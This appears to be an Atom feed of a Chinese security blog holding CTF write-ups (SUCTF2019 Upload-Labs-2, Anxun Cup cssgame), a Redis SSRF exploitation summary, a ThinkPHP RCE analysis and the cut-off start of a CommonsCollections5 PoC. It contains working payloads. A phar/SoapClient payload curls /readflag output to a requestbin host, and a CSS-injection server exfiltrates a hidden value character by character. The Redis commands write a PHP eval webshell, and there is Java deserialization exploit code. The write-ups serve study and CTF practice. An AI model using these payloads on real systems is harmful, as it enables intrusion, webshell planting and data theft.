<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>yemoli&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://yml-sec.top/"/>
  <updated>2021-01-05T14:06:47.233Z</updated>
  <id>https://yml-sec.top/</id>
  
  <author>
    <name>夜莫离、</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SUCTF2019-Upload-Labs-2复现分析</title>
    <link href="https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2021/01/05/SUCTF2019-Upload-Labs-2%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</id>
    <published>2021-01-05T13:00:31.000Z</published>
    <updated>2021-01-05T14:06:47.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目界面"><a href="#题目界面" class="headerlink" title="题目界面"></a>题目界面</h2><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/1.png" alt="1"></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202</a></p><p>buu中将admin.php中的Ad类的析构函数改成了下面的代码</p><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/2.png" alt="2"></p><p>命令执行的点也在这里，接着看admin.php中的代码</p><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/3.png" alt="3"></p><p>在这里我们需要进行ssrf才能使用此功能，同时为了到达命令执行的点我们需要通过check函数的检查</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line"><span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">$reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">$reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">$reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br></pre></td></tr></table></figure><p>在这里通过反射来调用类中的方法，我们可以寻找一个存在单参数方法的原生类，这里用到了SplDoublyLinkedList::unshift，如图</p><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/4.png" alt="4"></p><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/5.png" alt="5"></p><p>接着在func.php中存在着如下的代码</p><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/6.png" alt="6"></p><p>跟进getMIME</p><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/7.png" alt="7"></p><p>其中finfo_file可以触发phar反序列化</p><p>为了绕过func.php中的正则，我们可以使用php伪协议绕过，同时在File类中存在着如下wakeup方法</p><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/8.png" alt="8"></p><p>在该方法中使用反射可以获取到任意类的实例，在这里自然想到soap反序列化，当执行到$a-&gt;check();时候会触发soap类中的__call方法，可以造成ssrf，参考如下文章：<a href="https://blog.csdn.net/qq_38154820/article/details/106330082" target="_blank" rel="noopener">https://blog.csdn.net/qq_38154820/article/details/106330082</a></p><p>在这里可以构造如下生成phar的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $target = <span class="string">'http://127.0.0.1/admin.php'</span>;</span><br><span class="line">$post_string = <span class="string">'admin=1&amp;cmd=curl "http://http.requestbin.buuoj.cn/w7rkm9w7?a=`/readflag`"&amp;clazz=SplDoublyLinkedList&amp;func1=unshift&amp;func2=unshift&amp;func3=unshift&amp;arg1=1&amp;arg2=2&amp;arg3=3'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: name=1234'</span></span><br><span class="line">    );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="string">"SoapClient"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = [<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">"wupco\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>.join(<span class="string">"\r\n"</span>,$headers).<span class="string">"\r\nContent-Length: "</span>.(string)strlen($post_string).<span class="string">"\r\n\r\n"</span>.$post_string,<span class="string">'uri'</span>=&gt; <span class="string">"aaab"</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> File();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传后触发phar</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/resource=phar:/</span><span class="regexp">/upload/</span>f528764d624db129b32c21fbca0cb8d6<span class="regexp">/394659692a460258b45a99f1424ea357.jpg</span></span><br></pre></td></tr></table></figure><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/9.png" alt="9"></p><p>拿到flag</p><p><img src="/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/10.png" alt="10"></p><p>参考链接：<a href="https://guokeya.github.io/post/-05AEB0Yn/" target="_blank" rel="noopener">https://guokeya.github.io/post/-05AEB0Yn/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目界面&quot;&gt;&lt;a href=&quot;#题目界面&quot; class=&quot;headerlink&quot; title=&quot;题目界面&quot;&gt;&lt;/a&gt;题目界面&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2021/01/05/SUCTF2019-Upload-Labs-2复现分析/1.png&quot; alt=&quot;
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯2019-cssgame题目复现</title>
    <link href="https://yml-sec.top/2021/01/04/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-cssgame%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://yml-sec.top/2021/01/04/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-cssgame%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-01-04T14:19:40.000Z</published>
    <updated>2021-01-04T15:46:50.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><p>Css注入</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目界面</p><p><img src="/2021/01/04/安洵杯2019-cssgame题目复现/1.png" alt="1"></p><p>F12可看到内网中的flag.html的内容</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;link rel="stylesheet" href="$&#123;encodeURI(req.query.css)&#125;" /&gt;</span><br><span class="line">  &lt;form&gt;</span><br><span class="line">     &lt;<span class="keyword">input</span> <span class="type">name</span>="Email" <span class="keyword">type</span>="text" <span class="keyword">value</span>="test"&gt;</span><br><span class="line">     &lt;<span class="keyword">input</span> <span class="type">name</span>="flag" <span class="keyword">type</span>="hidden" <span class="keyword">value</span>="202cb962ac59075b964b07152d234b70"/&gt;</span><br><span class="line">     &lt;<span class="keyword">input</span> <span class="keyword">type</span>="submit" <span class="keyword">value</span>="提交"&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>flag的属性是hidden，无法直接看到，在这里我们只能控制flag.html加载我们自定义的CSS文件，这里可使用CSS选择器逐位匹配爆破出flag，参考官方wp，payload如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input[<span class="string">name=flag</span>][<span class="symbol">value^="b"</span>] ~ * &#123;background-image: url("http://x.x.x.x/b");&#125;</span><br></pre></td></tr></table></figure><p>该段payload <code>input[name=flag][value^=&quot;b&quot;]</code>参考</p><p><img src="/2021/01/04/安洵杯2019-cssgame题目复现/2.png" alt="2"></p><p>便于理解可以看下下面的例子</p><p><img src="/2021/01/04/安洵杯2019-cssgame题目复现/4.png" alt="4"></p><p>后半部分<code>~ * {background-image: url(&quot;http://x.x.x.x/b&quot;);}</code>，根据官方wp描述，有时候无法加载background-image，所以需要使用<code>~ *</code></p><p><img src="/2021/01/04/安洵杯2019-cssgame题目复现/3.png" alt="3"></p><p>接着来理解下<code>~ *</code></p><p><img src="/2021/01/04/安洵杯2019-cssgame题目复现/5.png" alt="5"></p><p><img src="/2021/01/04/安洵杯2019-cssgame题目复现/6.png" alt="6"></p><p>那么我们就可以通过这样逐位爆破的方法得到属性为hidden的flag</p><p>可以参考学习下下面文章中的脚本</p><p><a href="https://www.glacierluo.com/exercise/ctf/web/cssgame/" target="_blank" rel="noopener">https://www.glacierluo.com/exercise/ctf/web/cssgame/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">dic = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-"</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/poc.css')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    res = <span class="string">''''''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        j = <span class="string">''</span>.join((result, i))</span><br><span class="line">        res += <span class="string">'''input[name=flag][value^="'''</span>+j+<span class="string">'''"] ~ * &#123;background-image:url("http://172.16.157.212:8899/'''</span>+j+<span class="string">'''");&#125;\n'''</span></span><br><span class="line">    <span class="keyword">return</span> res, <span class="number">200</span>, [(<span class="string">"Content-Type"</span>, <span class="string">"text/css"</span>)]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;flag&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all</span><span class="params">(flag)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    result = flag</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>可能是由于网络原因不是每次都可以触发flag的回显，写个python脚本循环请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    burp0_url = <span class="string">"http://2c1fe10e-fee9-4956-b0f4-f87a2de7a0dc.node3.buuoj.cn:80/crawl.html"</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"UM_distinctid"</span>: <span class="string">"176929086fa3a0-0b0ed985080c69-163b6153-13c680-176929086fb472"</span>, <span class="string">"_ga"</span>: <span class="string">"GA1.2.602800589.1608776974"</span>, <span class="string">"_gid"</span>: <span class="string">"GA1.2.1740085603.1609750409"</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">"Pragma"</span>: <span class="string">"no-cache"</span>, <span class="string">"Cache-Control"</span>: <span class="string">"no-cache"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,   <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"</span>, <span class="string">"Origin"</span>: <span class="string">"http://2c1fe10e-fee9-4956-b0f4-f87a2de7a0dc.node3.buuoj.cn"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>, <span class="string">"Referer"</span>: <span class="string">"http://2c1fe10e-fee9-4956-b0f4-f87a2de7a0dc.node3.buuoj.cn/"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">"css"</span>: <span class="string">"http://172.16.157.212:8899/poc.css"</span>&#125;</span><br><span class="line">    session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/01/04/安洵杯2019-cssgame题目复现/7.png" alt="7"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/6911#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/6911#toc-12</a></p><p><a href="https://www.glacierluo.com/exercise/ctf/web/cssgame/" target="_blank" rel="noopener">https://www.glacierluo.com/exercise/ctf/web/cssgame/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目考点&quot;&gt;&lt;a href=&quot;#题目考点&quot; class=&quot;headerlink&quot; title=&quot;题目考点&quot;&gt;&lt;/a&gt;题目考点&lt;/h2&gt;&lt;p&gt;Css注入&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Redis利用总结</title>
    <link href="https://yml-sec.top/2020/12/27/Redis%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>https://yml-sec.top/2020/12/27/Redis%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2020-12-27T06:04:38.000Z</published>
    <updated>2020-12-30T07:20:15.862Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF攻击Redis"><a href="#SSRF攻击Redis" class="headerlink" title="SSRF攻击Redis"></a>SSRF攻击Redis</h1><h2 id="dict协议利用"><a href="#dict协议利用" class="headerlink" title="dict协议利用"></a>dict协议利用</h2><p>dīct协议禁止执行多行命令，所以我们无法使用该协议攻击需要认证的redis</p><p>利用dict协议时可使用冒号或空格来分割命令，可先使用info语句探测一下是否是未授权的redis</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">192.168</span><span class="meta">.196</span><span class="meta">.132</span>/?url=dict://<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">6379</span>/info</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/Redis利用总结/1.png" alt="1"></p><p>写shell语句如下</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line"><span class="string">config:</span><span class="string">set:</span><span class="string">dir:</span><span class="regexp">/www/</span>admin<span class="regexp">/localhost_80/</span>wwwroot</span><br><span class="line"><span class="string">config:</span><span class="string">set:</span><span class="string">dbfilename:</span>shell.php</span><br><span class="line"><span class="string">set:</span><span class="string">webshell:</span><span class="string">"\x3C\x3Fphp\x20eval($_POST[x])\x3B\x3F\x3E"</span></span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>每次只能发送一条命令</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">dict:</span><span class="comment">//127.0.0.1:6379/flushall  等等</span></span><br></pre></td></tr></table></figure><p>成功写入</p><p><img src="/2020/12/27/Redis利用总结/2.png" alt="2"></p><h2 id="gopher协议利用"><a href="#gopher协议利用" class="headerlink" title="gopher协议利用"></a>gopher协议利用</h2><h3 id="gopher攻击未授权redis"><a href="#gopher攻击未授权redis" class="headerlink" title="gopher攻击未授权redis"></a>gopher攻击未授权redis</h3><p>使用<a href="https://github.com/firebroo/sec_tools中的gopher生成工具" target="_blank" rel="noopener">https://github.com/firebroo/sec_tools中的gopher生成工具</a></p><p>写shell命令</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">config <span class="keyword">set</span> dir /www/<span class="comment">admin</span>/localhost_80/<span class="comment">wwwroot</span></span><br><span class="line">config <span class="comment">set dbfilename shell.php</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">'webshell'</span> <span class="comment">'&lt;?php eval($_POST[1]);?&gt;'</span></span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/Redis利用总结/3.png" alt="3"></p><p>利用ssrf</p><p><img src="/2020/12/27/Redis利用总结/4.png" alt="4"></p><p>注意在浏览器中发送payload时需要对gopher协议后的数据进行二次URL编码</p><p><img src="/2020/12/27/Redis利用总结/5.png" alt="5"></p><p>成功写入webshell</p><h3 id="gopher攻击授权redis"><a href="#gopher攻击授权redis" class="headerlink" title="gopher攻击授权redis"></a>gopher攻击授权redis</h3><p>写shell</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">auth <span class="number">123456</span></span><br><span class="line">config <span class="keyword">set</span> dir /www/<span class="comment">admin</span>/localhost_80/<span class="comment">wwwroot</span></span><br><span class="line">config <span class="comment">set dbfilename shell.php</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">'webshell'</span> <span class="comment">'&lt;?php eval($_POST[1]);?&gt;'</span></span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/Redis利用总结/6.png" alt="6"></p><p>访问shell</p><p><img src="/2020/12/27/Redis利用总结/7.png" alt="7"></p><h2 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h2><p>工具：<a href="https://github.com/Dliv3/redis-rogue-server" target="_blank" rel="noopener">https://github.com/Dliv3/redis-rogue-server</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SSRF攻击Redis&quot;&gt;&lt;a href=&quot;#SSRF攻击Redis&quot; class=&quot;headerlink&quot; title=&quot;SSRF攻击Redis&quot;&gt;&lt;/a&gt;SSRF攻击Redis&lt;/h1&gt;&lt;h2 id=&quot;dict协议利用&quot;&gt;&lt;a href=&quot;#dict协议利用&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ThinkPHP命令执行分析</title>
    <link href="https://yml-sec.top/2020/12/22/ThinkPHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2020/12/22/ThinkPHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/</id>
    <published>2020-12-22T01:17:26.000Z</published>
    <updated>2020-12-22T02:43:25.823Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="method调用任意方法导致的RCE"><a href="#method调用任意方法导致的RCE" class="headerlink" title="method调用任意方法导致的RCE"></a>method调用任意方法导致的RCE</h2><p>漏洞触发点位于<code>\thinkphp\library\think\Request.php</code>中的<code>filterValue</code>方法，如下</p><p><img src="/2020/12/22/ThinkPHP命令执行分析/1.jpg" alt="1"></p><p>该处存在可利用的<code>call_user_func</code>，继续寻找何处调用了<code>filterValue</code>方法，在同类中的<code>input</code>方法中调用了此方法</p><p><img src="/2020/12/22/ThinkPHP命令执行分析/2.jpg" alt="2"></p><p>继续向上回溯，在同类中的param方法调用了<code>input</code>方法</p><p><img src="/2020/12/22/ThinkPHP命令执行分析/3.jpg" alt="3"></p><p>接着来注意到method方法</p><p><img src="/2020/12/22/ThinkPHP命令执行分析/4.jpg" alt="4"></p><p>在这里<code>$this-&gt;method</code>的值为<code>POST</code>键值为<code>_method</code>的值</p><p><img src="/2020/12/22/ThinkPHP命令执行分析/5.jpg" alt="5"></p><p>那么在这里通过<code>$this-&gt;{$this-&gt;method}($_POST);</code>调用<code>Request</code>类的任意方法，接着注意到此类中的<code>__construct</code>方法</p><p><img src="/2020/12/22/ThinkPHP命令执行分析/6.jpg" alt="6"></p><p>该方法中可以进行变量的覆盖，那么到这里我们就可以使用<code>method</code>方法来给类中的变量赋值，为达到命令执行的目的我们需要控制<code>$data</code>和<code>$filter</code>的值，向上回溯后发现需要控制<code>$this-&gt;get</code>和<code>$this-&gt;filter</code>的值</p><p><img src="/2020/12/22/ThinkPHP命令执行分析/7.jpg" alt="7"></p><p><img src="/2020/12/22/ThinkPHP命令执行分析/8.jpg" alt="8"></p><p>接着需要弄清楚如何调用<code>method</code>和<code>param</code>方法，在位于<code>thinkphp\library\think\App.php</code>中的app类中的exec方法，当<code>$dispatch[&#39;type&#39;]</code>为<code>controller</code>或<code>method</code>时，就会触发无参数的<code>param</code>方法在<code>param</code>方法中会调用<code>method</code>方法，接着向上看，程序执行时会自动调用<code>run</code>方法</p><p><img src="/2020/12/22/ThinkPHP命令执行分析/10.jpg" alt="10"></p><p><code>run</code>方法中调用了<code>exec</code>方法，重要的是<code>$dispatch[&#39;type&#39;]</code>的值，我们只要找到个存在的路由就可以满足条件，默认存在着<code>?s=captcha</code>验证码路由，我们只要<code>post</code>注册路由的方法即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h1&gt;&lt;h2 id=&quot;method调用任意方法导致的RCE&quot;&gt;&lt;a href=&quot;#method调用任意方法导致的RCE&quot; class=&quot;
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>再探CommonsCollections利用链</title>
    <link href="https://yml-sec.top/2020/12/03/%E5%86%8D%E6%8E%A2CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>https://yml-sec.top/2020/12/03/%E5%86%8D%E6%8E%A2CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE/</id>
    <published>2020-12-03T13:29:09.000Z</published>
    <updated>2020-12-31T05:45:29.697Z</updated>
    
    <content type="html"><![CDATA[<p>再次温习一下CC链</p><h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC5</span> </span>&#123;</span><br><span class="line">    <span 